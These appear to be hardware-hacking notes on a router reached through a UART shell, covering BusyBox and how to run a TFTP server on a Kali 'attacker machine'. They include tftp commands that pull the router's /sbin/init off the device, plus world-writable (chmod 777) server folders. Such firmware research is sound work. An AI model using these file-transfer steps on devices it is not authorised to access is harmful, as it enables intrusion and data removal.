In the UART shell, list all available binaries in the directory /bin:

We can see that every command is just a symlink to busybox.

# Busybox

>[!Info] Wikipedia
>*BusyBox* is a software suite that provides several Unix utilities in a single executable file. \[...]. It was specifically created for embedded operating systems with very limited resources. The authors dubbed it "The Swiss Army knife of Embedded Linux", as the **single executable** replaces basic functions of more than 300 common commands.

If we type the command `busybox` in the shell, we can see the help message which also shows all the functions that are present:

>[!Note] Run function/program
>Programs included in BusyBox can be run simply by adding their name as an argument to the BusyBox executable:
`/bin/busybox ls`

# Transfer files from and to the router via TFTP

>[!Info] Wikipedia
>Trivial File Transfer Protocol (TFTP) is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host. One of its primary uses is in the early stages of nodes booting from a local area network. TFTP has been used for this application because it is very simple to implement.

The command **tftp** allows us to transfer files:

Since the busybox functions are very restricted on the router, we will leverage **tftp** to transfer over a complete busybox executable will all available functions. For this we will need to host a tftp server on our attacker machine.

Kali Linux comes with the tftp-server **atftpd** preinstalled:

## Setup atftpd

Create/Edit the configuration file **/etc/default/atftpd**:
```txt
OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --maxthread 100 --verbose=5 --port 69 /srv/atftp"
```

Make sure the folder /srv/atftp has read/write permissions for anyone so you can transfer files:
```bash
sudo chmod 777 /srv/atftp
```

Run the server:
```bash
sudo atftpd --daemon
```

Transfer /sbin/init to our notebook:
```bash
tftp -p -l /sbin/init 192.168.0.100
```
Args:
`-p`: Put file
`-l`: Local file

>[!Note]
>This solution didnt work for me, as the atftpd server never started.

## Alternative Python tftp server setup

Since the previous atftpd server didn't work for me, I installed a python tftp server:
```bash
sudo pip install ptftpd
```

Created a root dir with 777 permissions:
```bash
mkdir tftpd
chmod 777 tftpd
```

Start the server:
```bash
sudo ptftpd -p 69 enp0s25 tftp
```

And finally transfer the file:
```bash
cd /sbin
tftp -p -l init 192.168.0.100
```
